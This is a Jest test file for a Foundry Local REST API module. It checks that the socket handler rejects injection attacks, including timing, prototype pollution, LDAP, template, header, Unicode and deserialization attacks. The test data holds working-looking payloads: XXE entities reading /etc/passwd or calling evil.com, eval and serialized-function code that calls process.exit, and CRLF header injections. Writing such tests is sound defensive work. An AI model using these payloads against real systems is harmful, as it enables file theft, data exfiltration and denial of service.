/**
 * Injection Attack Prevention Tests for Foundry Local REST API
 * Tests against various injection attack vectors
 */

import { SocketMessageHandler } from '../../scripts/socket-handler.js';
import { AuthManager } from '../../scripts/auth.js';

describe('Injection Attack Prevention', () => {
  let socketHandler;
  let authManager;

  beforeEach(() => {
    // Setup mock environment
    global.game = {
      user: { id: 'user123', role: 4, isGM: true },
      actors: new Map(),
      settings: {
        get: jest.fn().mockReturnValue('test-api-key')
      }
    };

    global.console.error = jest.fn();
    global.console.log = jest.fn();

    // Initialize handlers
    socketHandler = new SocketMessageHandler();
    socketHandler.setApiKey('test-api-key');
    authManager = new AuthManager();
    authManager.setApiKey('test-api-key-with-sufficient-length-for-testing');
  });

  describe('Timing Attack Prevention', () => {
    // Wall-clock timing of a JIT-compiled loop is too noisy to assert on in
    // CI (the old 20%-variance check failed by 3-4x on a quiet machine).
    // Assert the property that makes the comparison constant-time instead:
    // every key is compared through constantTimeEquals, which reads every
    // character pair rather than returning at the first mismatch.
    test('should compare API keys through constantTimeEquals', () => {
      const validKey = 'test-api-key-with-sufficient-length-for-testing';
      const spy = jest.spyOn(authManager, 'constantTimeEquals');

      const attempts = [
        'test-api-key-with-sufficient-length-for-testinG', // Last char different
        'Test-api-key-with-sufficient-length-for-testing', // First char different
        'short', // Different length
        validKey
      ];
      for (const key of attempts) {
        authManager.validateApiKey(key);
      }

      expect(spy).toHaveBeenCalledTimes(attempts.length);
      for (const key of attempts) {
        expect(spy).toHaveBeenCalledWith(key, validKey);
      }
      spy.mockRestore();
    });

    test('should read every character regardless of where keys differ', () => {
      const validKey = 'test-api-key-with-sufficient-length-for-testing';
      const firstDiffers = 'Xest-api-key-with-sufficient-length-for-testing';
      const lastDiffers = 'test-api-key-with-sufficient-length-for-testinX';

      const countCharReads = (a, b) => {
        const spy = jest.spyOn(String.prototype, 'charCodeAt');
        const result = authManager.constantTimeEquals(a, b);
        const reads = spy.mock.calls.length;
        spy.mockRestore();
        return { result, reads };
      };

      const first = countCharReads(firstDiffers, validKey);
      const last = countCharReads(lastDiffers, validKey);
      const same = countCharReads(validKey, validKey);

      expect(first.result).toBe(false);
      expect(last.result).toBe(false);
      expect(same.result).toBe(true);
      expect(first.reads).toBe(validKey.length * 2);
      expect(last.reads).toBe(first.reads);
      expect(same.reads).toBe(first.reads);
    });
  });

  describe('Prototype Pollution Prevention', () => {
    test('should prevent __proto__ pollution', async () => {
      const pollutionAttempts = [
        {
          type: 'actors.search',
          params: {
            __proto__: { isAdmin: true },
            query: 'test'
          }
        },
        {
          type: 'actors.search',
          params: {
            constructor: {
              prototype: { isAdmin: true }
            }
          }
        },
        {
          type: 'actors.search',
          params: {
            query: {
              __proto__: { polluted: true }
            }
          }
        }
      ];

      for (const attempt of pollutionAttempts) {
        const request = {
          ...attempt,
          requestId: 'req123',
          auth: { apiKey: 'test-api-key' }
        };

        await socketHandler.handleMessage(request);

        // Check that prototype wasn't polluted
        expect({}.isAdmin).toBeUndefined();
        expect({}.polluted).toBeUndefined();
        expect(Object.prototype.isAdmin).toBeUndefined();
        expect(Object.prototype.polluted).toBeUndefined();
      }
    });
  });

  describe('Code Injection Prevention', () => {
    test('should prevent eval and Function constructor injection', async () => {
      const codeInjections = [
        'eval("process.exit()")',
        'new Function("return process.exit()")()',
        'setTimeout("malicious()", 0)',
        'setInterval("malicious()", 1000)',
        'constructor.constructor("return process.exit()")()'
      ];
      // Observe process.exit without letting a call end the test run
      const exitSpy = jest.spyOn(process, 'exit').mockImplementation(() => {});

      for (const injection of codeInjections) {
        const request = {
          type: 'dice.roll',
          requestId: 'req123',
          auth: { apiKey: 'test-api-key' },
          body: { formula: injection }
        };

        const response = await socketHandler.handleMessage(request);

        // Should reject without executing
        expect(response.success).toBe(false);
        expect(response.error).toBe('Validation Error');
        expect(response.message).toMatch(/invalid/i);

        // Process should still be running
        expect(exitSpy).not.toHaveBeenCalled();
      }
      exitSpy.mockRestore();
    });
  });

  describe('LDAP Injection Prevention', () => {
    test('should sanitize LDAP-like patterns', async () => {
      const ldapInjections = [
        '*)(uid=*',
        'admin*)(|(uid=*',
        '*)(objectClass=*',
        'admin)(|(password=*',
        '*)(&(password=*'
      ];

      for (const injection of ldapInjections) {
        const request = {
          type: 'actors.search',
          requestId: 'req123',
          auth: { apiKey: 'test-api-key' },
          params: { query: { query: injection } }
        };

        const response = await socketHandler.handleMessage(request);

        // Should sanitize special characters
        expect(response.success).toBe(true);
        expect(response.data.data).toEqual([]);
      }
    });
  });

  describe('XML Injection Prevention', () => {
    test('should prevent XML entity expansion attacks', async () => {
      const xmlInjections = [
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'
      ];

      for (const injection of xmlInjections) {
        const request = {
          type: 'actors.search',
          requestId: 'req123',
          auth: { apiKey: 'test-api-key' },
          params: { query: { query: injection } }
        };

        const response = await socketHandler.handleMessage(request);

        // Markup is rejected by validation before any search runs
        expect(response.success).toBe(false);
        expect(response.error).toBe('Validation Error');
        expect(response.message).toMatch(/forbidden xss patterns|too long/);
        expect(JSON.stringify(response)).not.toContain('root:');
      }
    });
  });

  describe('Template Injection Prevention', () => {
    test('should prevent template injection', async () => {
      const templateInjections = [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '{{config.items()}}',
        '{{self._TemplateReference__context}}'
      ];

      for (const injection of templateInjections) {
        const request = {
          type: 'actors.search',
          requestId: 'req123',
          auth: { apiKey: 'test-api-key' },
          params: { query: { query: injection } }
        };

        const response = await socketHandler.handleMessage(request);

        // Should not evaluate templates
        if (response.success && response.data.data.length > 0) {
          expect(JSON.stringify(response.data.data[0])).not.toContain('49'); // 7*7
        }
      }
    });
  });

  describe('Header Injection Prevention', () => {
    test('should prevent HTTP header injection', async () => {
      const headerInjections = [
        'value\r\nX-Injected: true',
        'value\nSet-Cookie: admin=true',
        'value\r\n\r\n<script>alert("XSS")</script>'
      ];

      for (const injection of headerInjections) {
        const request = {
          type: 'actors.search',
          requestId: 'req123',
          auth: { apiKey: injection }, // Try to inject through auth header
          params: { query: { query: 'test' } }
        };

        const response = await socketHandler.handleMessage(request);

        // Should reject invalid header values
        expect(response.success).toBe(false);
        expect(response.error).toContain('Unauthorized');
      }
    });
  });

  describe('Unicode/Encoding Attack Prevention', () => {
    test('should handle Unicode normalization attacks', async () => {
      const unicodeAttacks = [
        '\u202E\u0061\u0064\u006D\u0069\u006E', // Right-to-left override
        'admin\u0000', // Null byte injection
        'admin\u200b\u200c\u200d', // Zero-width characters
        '\uFEFFadmin', // Byte order mark
        'ａｄｍｉｎ' // Full-width characters
      ];

      for (const attack of unicodeAttacks) {
        const request = {
          type: 'actors.search',
          requestId: 'req123',
          auth: { apiKey: 'test-api-key' },
          params: { query: { query: attack } }
        };

        const response = await socketHandler.handleMessage(request);

        // Should normalize or reject suspicious Unicode
        expect(response.success).toBe(true);
        expect(response.data.data).toEqual([]);
      }
    });
  });

  describe('Integer Overflow Prevention', () => {
    test('should handle integer overflow attempts', async () => {
      const overflowValues = [
        Number.MAX_SAFE_INTEGER + 1,
        Number.MIN_SAFE_INTEGER - 1,
        '9999999999999999999999',
        '-9999999999999999999999'
      ];

      for (const value of overflowValues) {
        const request = {
          type: 'actors.search',
          requestId: 'req123',
          auth: { apiKey: 'test-api-key' },
          params: { query: { limit: value } }
        };

        const response = await socketHandler.handleMessage(request);

        // Should cap or reject overflow values
        if (response.success) {
          expect(response.data.data.length).toBeLessThanOrEqual(100);
        } else {
          expect(response.error).toBe('Validation Error');
          expect(response.message).toMatch(/limit/);
        }
      }
    });
  });

  describe('Deserialization Attack Prevention', () => {
    test('should prevent unsafe deserialization', async () => {
      const serializedPayloads = [
        '{"rce":"_$$ND_FUNC$$_function(){return process.exit()}"}',
        '{"__proto__":{"polluted":true}}',
        '{"constructor":{"prototype":{"polluted":true}}}'
      ];

      for (const payload of serializedPayloads) {
        const request = {
          type: 'actors.search',
          requestId: 'req123',
          auth: { apiKey: 'test-api-key' },
          params: JSON.parse(payload)
        };

        // Should safely handle without executing
        try {
          await socketHandler.handleMessage(request);
        } catch (error) {
          // Should not throw process-ending errors
          expect(error.message).not.toContain('process.exit');
        }

        // Check prototype pollution didn't occur
        expect({}.polluted).toBeUndefined();
      }
    });
  });
});
